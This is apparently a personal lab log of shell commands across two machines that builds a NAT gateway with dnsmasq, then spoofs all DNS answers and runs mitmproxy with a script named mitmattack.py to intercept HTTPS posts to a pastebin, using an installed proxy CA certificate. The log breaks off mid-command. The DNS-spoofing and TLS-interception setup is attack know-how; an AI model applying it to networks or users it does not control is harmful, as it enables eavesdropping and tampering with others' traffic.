- Computer 1, Terminal 1
> nmcli device set eno1 managed no
> sudo ip address add dev eno1 192.168.22.1
> sudo ip route add 192.168.22.0/24 dev eno1 src 192.168.22.1
> sudo sysctl -w net.ipv4.ip_unprivileged_port_start=0
> sudo sysctl -w net.ipv4.ip_forward=1
> sudo nft add table ip filter
> sudo nft add chain ip filter forward { type filter hook forward priority filter\; policy drop\; }
> sudo nft add rule ip filter forward ip saddr 192.168.22.0/24 iif eno1 oif wlp2s0 accept
> sudo nft add rule ip filter forward ct state {established, related} accept
> sudo nft add rule ip filter forward log prefix "Dropped " flags all drop
> sudo nft add table ip nat
> sudo nft add chain ip nat postrouting { type nat hook postrouting priority srcnat\; policy accept\; }
> sudo nft add rule ip nat postrouting ip saddr 192.168.22.0/24 ip daddr != 192.168.22.0/24 iif eno1 oif wlp2s0 masquerade
> sudo /usr/sbin/dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --keep-in-foreground --interface=eno1 --except-interface=lo --clear-on-reload --strict-order --listen-address=192.168.22.1 --bind-interfaces --no-poll --server=1.1.1.1  --cache-size=0  --dhcp-range=192.168.22.1,192.168.22.255,255.255.255.0,400w --dhcp-authoritative --dhcp-leasefile=/tmp/yongbin.lease --dhcp-option=option:dns-server,192.168.22.1 --dhcp-option=3,192.168.22.1 --log-queries --log-facility=-

# post text without MITM attack
- Computer 2, Terminal 1
> echo "Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks." | curl -sS -F 'sprunge=<-' https://sprunge.us
http://sprunge.us/yqnNHp
> curl https://sprunge.us/yqnNHp
Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks.
# the result above is correct

- Computer 1, Terminal 2
> sudo kill $(ps -ef |grep dnsmasq|grep yongbin -m 1|sed "s/\w* *//"|cut -d " " -s -f 1)
> sudo /usr/sbin/dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --keep-in-foreground --interface=eno1 --except-interface=lo --clear-on-reload --strict-order --listen-address=192.168.22.1 --bind-interfaces --no-poll --address=/#/192.168.22.1  --cache-size=0  --dhcp-range=192.168.22.1,192.168.22.255,255.255.255.0,400w --dhcp-authoritative --dhcp-leasefile=/tmp/yongbin.lease --dhcp-option=option:dns-server,192.168.22.1 --dhcp-option=3,192.168.22.1 --log-queries --log-facility=-

- Computer 1, Terminal 1
> mitmproxy --listen-port 443 --listen-host 192.168.22.1 -s mitmattack.py

- Computer 1, Terminal 3
> python3 -m http.server -d ~/.mitmproxy/

- Computer 2, Terminal 1
> wget 192.168.22.1/mitmproxy-ca-cert.pem

- Computer 1, Terminal 3
> ^C

# post text in when CA is doing MITM attack, without hood
- Computer 2, Terminal 1
> echo "Thank you very much for the feedback. Your suggestion on X sounds legit. I will make X able to Y after I finished Z. I will send you another email once I finished related tasks." | curl -sS --cacert mitmproxy-ca-cert.pem -F 'sprunge=<-' https://sprunge.us

> curl -sS 

- Computer 1, Terminal 3
> sudo kill $(ps -ef |grep dnsmasq|grep yongbin -m 1|sed "s/\w* *//"|cut -d " " -s -f 1)
